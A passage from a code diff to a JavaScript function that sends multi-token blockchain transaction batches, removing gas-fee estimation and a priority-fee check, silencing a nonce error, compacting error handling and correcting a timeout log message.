-          } catch (e) {
-            finalMaxFee = baseFee + networkTip;
-            logger.warn(`[gas-strategy] ⚠️ Gas check failed. Firing at original base fee.`);
-          }
-        }
-      }
-
-      maxFeePerGas = finalMaxFee;
-      maxPriorityFeePerGas = networkTip;
-
-    } catch (e) {
-      logger.warn(`[gas-strategy] Failed to estimate fees, using defaults: ${e.message}`);
-    }
-
-    // 🚀 CRITICAL SAFETY: Ensure priority fee is NEVER higher than max fee
-    if (maxPriorityFeePerGas >= maxFeePerGas) {
-      maxPriorityFeePerGas = maxFeePerGas / 2n;
-    }
 
     // 🚀 Build the multi-token batch calls array
     const calls = [];
@@ -2029,7 +1772,6 @@ async function emitMultiTokenBatch(walletClient, campaignId, contractGroups) {
 
     let lastError = null;
     let hash = null;
-
     const rpcUrls = fallbackUrls.length > 0 ? fallbackUrls : [chainRpc];
     const maxAttempts = Math.min(rpcUrls.length, 46);
 
@@ -2068,19 +1810,11 @@ async function emitMultiTokenBatch(walletClient, campaignId, contractGroups) {
             nonce = freshNonce;
             const nonces = campaignNonces.get(campaignId);
             if (nonces) nonces.set(operatorAddress, freshNonce);
-          } catch (nonceErr) {
-            logger.warn(`[multi-batch] Failed to fetch fresh nonce: ${nonceErr.message}`);
-          }
+          } catch (nonceErr) { }
         }
 
-        const isFatal =
-          errMsg.includes('invalid private key') ||
-          errMsg.includes('unknown account') ||
-          errMsg.includes('missing revert data');
-
-        if (isFatal) {
-          throw err;
-        }
+        const isFatal = errMsg.includes('invalid private key') || errMsg.includes('unknown account') || errMsg.includes('missing revert data');
+        if (isFatal) throw err;
 
         logger.warn(`[multi-batch] RPC ${attempt + 1}/${maxAttempts} (${currentRpc}) failed: ${errMsg.slice(0, 60)}... rotating`);
         await new Promise(resolve => setTimeout(resolve, 1000));
@@ -2088,21 +1822,15 @@ async function emitMultiTokenBatch(walletClient, campaignId, contractGroups) {
       }
     }
 
-    if (!hash && lastError) {
-      throw lastError;
-    }
+    if (!hash && lastError) throw lastError;
 
     let receiptSuccess = false;
     try {
-      const receipt = await client.waitForTransactionReceipt({
-        hash: hash,
-        timeout: 300000, // 🚀 Increased to 5 minutes for slow confirmations
-        confirmations: 1,
-      });
+      const receipt = await client.waitForTransactionReceipt({ hash: hash, timeout: 300000, confirmations: 1 });
       logger.info(`[multi-batch] ✅ TX confirmed in block ${receipt.blockNumber} (status: ${receipt.status})`);
       receiptSuccess = true;
     } catch (waitErr) {
-      logger.warn(`[multi-batch] ⚠️ TX ${hash.slice(0, 14)}... not confirmed in 90s (may have been dropped): ${waitErr.message?.slice(0, 60)}`);
+      logger.warn(`[multi-batch] ⚠️ TX ${hash.slice(0, 14)}... not confirmed in 5 mins (may have been dropped): ${waitErr.message?.slice(0, 60)}`);
     }
 
     if (receiptSuccess) {
@@ -2114,11 +1842,10 @@ async function emitMultiTokenBatch(walletClient, campaignId, contractGroups) {
       const nonces = campaignNonces.get(campaignId);
       if (nonces) nonces.delete(operatorAddress);
       logger.error(`[multi-batch] ❌ Batch timed out and was dropped by the network. tx=${hash}`);
-      return false; // 🚀 FIX: Return false so it triggers the failure alert instead of a fake success!
+      return false;
     }
   }).catch(err => {
     const errMsg = err.message || String(err);
-
     const nonces = campaignNonces.get(campaignId);
     if (nonces && nonces.has(operatorAddress)) {
       nonces.set(operatorAddress, Math.max(0, nonces.get(operatorAddress) - 1));
